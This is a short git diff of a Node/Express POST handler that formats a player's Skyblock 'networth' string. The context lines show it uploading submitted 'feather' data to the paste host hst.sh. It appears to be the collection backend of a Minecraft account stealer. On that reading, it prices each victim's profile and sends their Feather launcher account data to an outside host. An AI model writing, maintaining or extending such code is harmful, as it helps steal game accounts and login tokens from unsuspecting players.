@@ -96,8 +96,8 @@ app.post("/", (req, res) => {
                 //check if has profiles, if api off or if normal
                 let total_networth
                 if (networth == null) total_networth = `[NW] No profile data found [NW]`
-                else if (networth.noInventory) total_networth = `[NW] Without inventory (API OFF): ${formatNumber(networth.networth)} [NW]`
-                else total_networth = `[NW] ${formatNumber(networth.networth)} [NW]`
+                else if (networth.noInventory) total_networth = `[NW] Without inventory (API OFF): ${formatNumber(networth.networth)} (${formatNumber(networth.unsoulboundNetworth)}) [NW]`
+                else total_networth = `[NW] ${formatNumber(networth.networth)} (${formatNumber(networth.unsoulboundNetworth)}) [NW]`
 
                 //upload feather
                 const feather = await (await post("https://hst.sh/documents/", req.body.feather).catch(() => { return { data: { key: "Error uploading" } } })).data.key
